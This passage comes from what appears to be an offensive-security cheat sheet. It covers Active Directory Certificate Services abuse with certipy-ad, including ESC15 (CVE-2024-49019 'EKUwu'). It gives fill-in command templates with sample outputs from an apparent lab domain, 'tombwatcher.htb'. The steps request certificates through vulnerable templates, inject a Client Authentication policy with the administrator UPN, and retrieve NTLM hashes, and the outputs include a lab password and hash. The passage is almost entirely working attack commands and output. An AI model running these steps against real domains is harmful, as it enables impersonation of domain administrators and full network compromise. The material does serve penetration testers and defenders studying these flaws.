</span></span><span class="line"><span class="cl"><span class="go">certipy-ad req -u '<span class="o editable-keyword">&lt;USER&gt;</span>' -hashes '<span class="o editable-keyword">&lt;HASH&gt;</span>' -target <span class="o editable-keyword">&lt;TARGET&gt;</span> -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span> -ca <span class="o editable-keyword">&lt;CA&gt;</span> -template <span class="o editable-keyword">&lt;VULN_TEMPLATE&gt;</span>
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><div class="highlight password-based-kerberos codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Password-based Kerberos
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad req -u '<span class="o editable-keyword">&lt;USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>' -p '<span class="o editable-keyword">&lt;PASSWORD&gt;</span>' -k -target <span class="o editable-keyword">&lt;TARGET&gt;</span> -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span> -dc-host <span class="o editable-keyword">&lt;DC&gt;</span> -ns <span class="o editable-keyword">&lt;DC_IP&gt;</span> -ca <span class="o editable-keyword">&lt;CA&gt;</span> -template <span class="o editable-keyword">&lt;VULN_TEMPLATE&gt;</span>
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><div class="highlight ntlm-based-kerberos codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> NTLM-based Kerberos
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad req -u '<span class="o editable-keyword">&lt;USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>' -hashes '<span class="o editable-keyword">&lt;HASH&gt;</span>' -k -target <span class="o editable-keyword">&lt;TARGET&gt;</span> -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span> -dc-host <span class="o editable-keyword">&lt;DC&gt;</span> -ns <span class="o editable-keyword">&lt;DC_IP&gt;</span> -ca <span class="o editable-keyword">&lt;CA&gt;</span> -template <span class="o editable-keyword">&lt;VULN_TEMPLATE&gt;</span>
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><div class="highlight ticket-based-kerberos codeBlock-end"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Ticket-based Kerberos
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad req -u '<span class="o editable-keyword">&lt;USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>' -k -target <span class="o editable-keyword">&lt;TARGET&gt;</span> -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span> -dc-host <span class="o editable-keyword">&lt;DC&gt;</span> -ns <span class="o editable-keyword">&lt;DC_IP&gt;</span> -ca <span class="o editable-keyword">&lt;CA&gt;</span> -template <span class="o editable-keyword">&lt;VULN_TEMPLATE&gt;</span>
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><h4 id="3-get-ntlm-hash">3. Get NTLM Hash</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">certipy-ad auth -pfx <span class="o editable-keyword">&lt;USER&gt;</span>.pfx -domain <span class="o editable-keyword">&lt;DOMAIN&gt;</span> -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span> -u <span class="o editable-keyword">&lt;TARGET_USER&gt;</span>
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div></div></div><p></p>
<hr>
<h3 id="esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu">ESC15: Arbitrary Application Policy Injection in V1 Templates (CVE-2024-49019 "EKUwu")</h3>
<p class="tabs">
<button data-tabset="set17" data-tabcontent="tab1" class="active">Linux</button>

</p><div class="tabset-wrapper" data-tabset-group="set17"><div class="tabcontent active" data-tabset="set17" data-tabcontent="tab1"><h4 id="1-lookup-sid">1. Lookup SID</h4>
<div class="highlight password codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Password
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad account -u '<span class="o editable-keyword">&lt;USER&gt;</span>' -p '<span class="o editable-keyword">&lt;PASSWORD&gt;</span>' -target '<span class="o editable-keyword">&lt;DC&gt;</span>' -dc-ip '<span class="o editable-keyword">&lt;DC_IP&gt;</span>' -user 'administrator' read
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> certipy-ad account -u <span class="s1">'cert_admin'</span> -p <span class="s1">'Password123!'</span> -target <span class="s1">'DC01.tombwatcher.htb'</span> -dc-ip <span class="s1">'10.129.31.255'</span> -user <span class="s1">'cert_admin'</span> <span class="nb">read</span>
</span></span><span class="line"><span class="cl"><span class="go">Certipy v5.0.3 - by Oliver Lyak (ly4k)
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Reading attributes for 'cert_admin':
</span></span></span><span class="line"><span class="cl"><span class="go">    cn                                  : cert_admin.2
</span></span></span><span class="line"><span class="cl"><span class="go">    distinguishedName                   : CN=cert_admin.2,OU=ADCS,DC=tombwatcher,DC=htb
</span></span></span><span class="line"><span class="cl"><span class="go">    name                                : cert_admin.2
</span></span></span><span class="line"><span class="cl"><span class="go">    objectSid                           : S-1-5-21-1392491010-1358638721-2126982587-1111
</span></span></span><span class="line"><span class="cl"><span class="go">    sAMAccountName                      : cert_admin
</span></span></span><span class="line"><span class="cl"><span class="go">    userAccountControl                  : 66048
</span></span></span><span class="line"><span class="cl"><span class="go">    whenCreated                         : 2024-11-16T17:07:04+00:00
</span></span></span><span class="line"><span class="cl"><span class="go">    whenChanged                         : 2025-10-31T14:47:11+00:00
</span></span></span></div></pre></div><div class="highlight ntlm codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> NTLM
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad account -u '<span class="o editable-keyword">&lt;USER&gt;</span>' -hashes '<span class="o editable-keyword">&lt;HASH&gt;</span>' -target '<span class="o editable-keyword">&lt;DC&gt;</span>' -dc-ip '<span class="o editable-keyword">&lt;DC_IP&gt;</span>' -user 'administrator' read
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> certipy-ad account -u <span class="s1">'cert_admin'</span> -hashes <span class="s1">'2b576acbe6bcfda7294d6bd18041b8fe'</span> -target <span class="s1">'DC01.tombwatcher.htb'</span> -dc-ip <span class="s1">'10.129.31.255'</span> -user <span class="s1">'cert_admin'</span> <span class="nb">read</span>
</span></span><span class="line"><span class="cl"><span class="go">Certipy v5.0.3 - by Oliver Lyak (ly4k)
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Reading attributes for 'cert_admin':
</span></span></span><span class="line"><span class="cl"><span class="go">    cn                                  : cert_admin.2
</span></span></span><span class="line"><span class="cl"><span class="go">    distinguishedName                   : CN=cert_admin.2,OU=ADCS,DC=tombwatcher,DC=htb
</span></span></span><span class="line"><span class="cl"><span class="go">    name                                : cert_admin.2
</span></span></span><span class="line"><span class="cl"><span class="go">    objectSid                           : S-1-5-21-1392491010-1358638721-2126982587-1111
</span></span></span><span class="line"><span class="cl"><span class="go">    sAMAccountName                      : cert_admin
</span></span></span><span class="line"><span class="cl"><span class="go">    userAccountControl                  : 66048
</span></span></span><span class="line"><span class="cl"><span class="go">    whenCreated                         : 2024-11-16T17:07:04+00:00
</span></span></span><span class="line"><span class="cl"><span class="go">    whenChanged                         : 2025-10-31T14:47:11+00:00
</span></span></span></div></pre></div><div class="highlight password-based-kerberos codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Password-based Kerberos
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad account -u '<span class="o editable-keyword">&lt;USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>' -p '<span class="o editable-keyword">&lt;PASSWORD&gt;</span>' -k -target '<span class="o editable-keyword">&lt;DC&gt;</span>' -dc-host <span class="o editable-keyword">&lt;DC&gt;</span> -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span> -user 'administrator' read
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> certipy-ad account -u <span class="s1">'cert_admin@tombwatcher.htb'</span> -p <span class="s1">'Password123!'</span> -k -target <span class="s1">'DC01.tombwatcher.htb'</span> -dc-host DC01.tombwatcher.htb -dc-ip 10.129.31.255 -user <span class="s1">'cert_admin'</span> <span class="nb">read</span>
</span></span><span class="line"><span class="cl"><span class="go">Certipy v5.0.3 - by Oliver Lyak (ly4k)
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[!] KRB5CCNAME environment variable not set
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Reading attributes for 'cert_admin':
</span></span></span><span class="line"><span class="cl"><span class="go">    cn                                  : cert_admin.2
</span></span></span><span class="line"><span class="cl"><span class="go">    distinguishedName                   : CN=cert_admin.2,OU=ADCS,DC=tombwatcher,DC=htb
</span></span></span><span class="line"><span class="cl"><span class="go">    name                                : cert_admin.2
</span></span></span><span class="line"><span class="cl"><span class="go">    objectSid                           : S-1-5-21-1392491010-1358638721-2126982587-1111
</span></span></span><span class="line"><span class="cl"><span class="go">    sAMAccountName                      : cert_admin
</span></span></span><span class="line"><span class="cl"><span class="go">    userAccountControl                  : 66048
</span></span></span><span class="line"><span class="cl"><span class="go">    whenCreated                         : 2024-11-16T17:07:04+00:00
</span></span></span><span class="line"><span class="cl"><span class="go">    whenChanged                         : 2025-10-31T14:47:11+00:00
</span></span></span></div></pre></div><div class="highlight ntlm-based-kerberos codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> NTLM-based Kerberos
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad account -u '<span class="o editable-keyword">&lt;USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>' -hashes '<span class="o editable-keyword">&lt;HASH&gt;</span>' -k -target '<span class="o editable-keyword">&lt;DC&gt;</span>' -dc-host <span class="o editable-keyword">&lt;DC&gt;</span> -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span> -user 'administrator' read
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> certipy-ad account -u <span class="s1">'cert_admin@tombwatcher.htb'</span> -hashes <span class="s1">'2b576acbe6bcfda7294d6bd18041b8fe'</span> -k -target <span class="s1">'DC01.tombwatcher.htb'</span> -dc-host DC01.tombwatcher.htb -dc-ip 10.129.31.255 -user <span class="s1">'cert_admin'</span> <span class="nb">read</span>
</span></span><span class="line"><span class="cl"><span class="go">Certipy v5.0.3 - by Oliver Lyak (ly4k)
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[!] KRB5CCNAME environment variable not set
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Reading attributes for 'cert_admin':
</span></span></span><span class="line"><span class="cl"><span class="go">    cn                                  : cert_admin.2
</span></span></span><span class="line"><span class="cl"><span class="go">    distinguishedName                   : CN=cert_admin.2,OU=ADCS,DC=tombwatcher,DC=htb
</span></span></span><span class="line"><span class="cl"><span class="go">    name                                : cert_admin.2
</span></span></span><span class="line"><span class="cl"><span class="go">    objectSid                           : S-1-5-21-1392491010-1358638721-2126982587-1111
</span></span></span><span class="line"><span class="cl"><span class="go">    sAMAccountName                      : cert_admin
</span></span></span><span class="line"><span class="cl"><span class="go">    userAccountControl                  : 66048
</span></span></span><span class="line"><span class="cl"><span class="go">    whenCreated                         : 2024-11-16T17:07:04+00:00
</span></span></span><span class="line"><span class="cl"><span class="go">    whenChanged                         : 2025-10-31T14:47:11+00:00
</span></span></span></div></pre></div><div class="highlight ticket-based-kerberos codeBlock-end"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Ticket-based Kerberos
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad account -u '<span class="o editable-keyword">&lt;USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>' -k -target '<span class="o editable-keyword">&lt;DC&gt;</span>' -dc-host <span class="o editable-keyword">&lt;DC&gt;</span> -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span> -user 'administrator' read
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> certipy-ad account -u <span class="s1">'cert_admin@tombwatcher.htb'</span> -k -target <span class="s1">'DC01.tombwatcher.htb'</span> -dc-host DC01.tombwatcher.htb -dc-ip 10.129.31.255 -user <span class="s1">'cert_admin'</span> <span class="nb">read</span>
</span></span><span class="line"><span class="cl"><span class="go">Certipy v5.0.3 - by Oliver Lyak (ly4k)
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Reading attributes for 'cert_admin':
</span></span></span><span class="line"><span class="cl"><span class="go">    cn                                  : cert_admin.2
</span></span></span><span class="line"><span class="cl"><span class="go">    distinguishedName                   : CN=cert_admin.2,OU=ADCS,DC=tombwatcher,DC=htb
</span></span></span><span class="line"><span class="cl"><span class="go">    name                                : cert_admin.2
</span></span></span><span class="line"><span class="cl"><span class="go">    objectSid                           : S-1-5-21-1392491010-1358638721-2126982587-1111
</span></span></span><span class="line"><span class="cl"><span class="go">    sAMAccountName                      : cert_admin
</span></span></span><span class="line"><span class="cl"><span class="go">    userAccountControl                  : 66048
</span></span></span><span class="line"><span class="cl"><span class="go">    whenCreated                         : 2024-11-16T17:07:04+00:00
</span></span></span><span class="line"><span class="cl"><span class="go">    whenChanged                         : 2025-10-31T14:47:11+00:00
</span></span></span></div></pre></div><h4 id="2-inject-client-authentication-application-policy-and-target-upn">2. Inject "Client Authentication" Application Policy and Target UPN</h4>
<div class="highlight password codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Password
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad req -u '<span class="o editable-keyword">&lt;USER&gt;</span>' -p '<span class="o editable-keyword">&lt;PASSWORD&gt;</span>' -target <span class="o editable-keyword">&lt;TARGET&gt;</span> -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span> -ca <span class="o editable-keyword">&lt;CA&gt;</span> -template 'WebServer' -upn 'administrator@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>' -sid '<span class="o editable-keyword">&lt;SID&gt;</span>' -application-policies 'Client Authentication'
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> certipy-ad req -u <span class="s1">'cert_admin'</span> -p <span class="s1">'Password123!'</span> -target DC01.tombwatcher.htb -dc-ip 10.129.31.255 -ca tombwatcher-CA-1 -template <span class="s1">'WebServer'</span> -upn <span class="s1">'administrator@tombwatcher.htb'</span> -sid <span class="s1">'S-1-5-21-1392491010-1358638721-2126982587-500'</span> -application-policies <span class="s1">'Client Authentication'</span>
</span></span><span class="line"><span class="cl"><span class="go">Certipy v5.0.3 - by Oliver Lyak (ly4k)
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Requesting certificate via RPC
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Request ID is 11
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Successfully requested certificate
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Got certificate with UPN 'administrator@tombwatcher.htb'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Certificate object SID is 'S-1-5-21-1392491010-1358638721-2126982587-500'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Saving certificate and private key to 'administrator.pfx'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Wrote certificate and private key to 'administrator.pfx'
</span></span></span></div></pre></div><div class="highlight ntlm codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> NTLM
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad req -u '<span class="o editable-keyword">&lt;USER&gt;</span>' -hashes '<span class="o editable-keyword">&lt;HASH&gt;</span>' -target <span class="o editable-keyword">&lt;TARGET&gt;</span> -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span> -ca <span class="o editable-keyword">&lt;CA&gt;</span> -template 'WebServer' -upn 'administrator@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>' -sid '<span class="o editable-keyword">&lt;SID&gt;</span>' -application-policies 'Client Authentication'
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> certipy-ad req -u <span class="s1">'cert_admin'</span> -hashes <span class="s1">'2b576acbe6bcfda7294d6bd18041b8fe'</span> -target DC01.tombwatcher.htb -dc-ip 10.129.31.255 -ca tombwatcher-CA-1 -template <span class="s1">'WebServer'</span> -upn <span class="s1">'administrator@tombwatcher.htb'</span> -sid <span class="s1">'S-1-5-21-1392491010-1358638721-2126982587-1111'</span> -application-policies <span class="s1">'Client Authentication'</span>
</span></span><span class="line"><span class="cl"><span class="go">Certipy v5.0.3 - by Oliver Lyak (ly4k)
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Requesting certificate via RPC
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Request ID is 12
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Successfully requested certificate
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Got certificate with UPN 'administrator@tombwatcher.htb'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Certificate object SID is 'S-1-5-21-1392491010-1358638721-2126982587-1111'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Saving certificate and private key to 'administrator.pfx'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Wrote certificate and private key to 'administrator.pfx'
